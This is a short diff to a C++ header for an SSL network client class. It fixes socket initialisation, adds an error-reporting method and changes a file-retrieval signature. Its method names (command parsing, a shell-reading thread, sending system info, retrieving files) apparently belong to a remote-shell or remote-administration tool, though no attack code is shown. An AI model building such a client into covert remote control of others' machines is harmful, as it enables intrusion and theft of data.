@@ -6,7 +6,7 @@
 class Client: public Downloader{
 	private:
 		std::mutex mtxMutex;
-		int sckSocket;
+		int sckSocket = -1;
 		SSL_CTX *sslCTX = nullptr;
 	public:
 		SSL *sslSocket = nullptr;
@@ -28,6 +28,7 @@ class Client: public Downloader{
 			}
 			if(sckSocket){
 				close(sckSocket);
+				sckSocket = -1;
 			}
 		}
 		bool ParseCommand(char*&);
@@ -37,7 +38,8 @@ class Client: public Downloader{
 		void threadReadShell(int&);
 		bool SendInfo();
 		bool SendFullInfo();
-		void RetrieveFile(u64, c_char, const std::string);
+		int SendError(const char*);
+		void RetrieveFile(u64, const std::string);
 };
 
 #endif
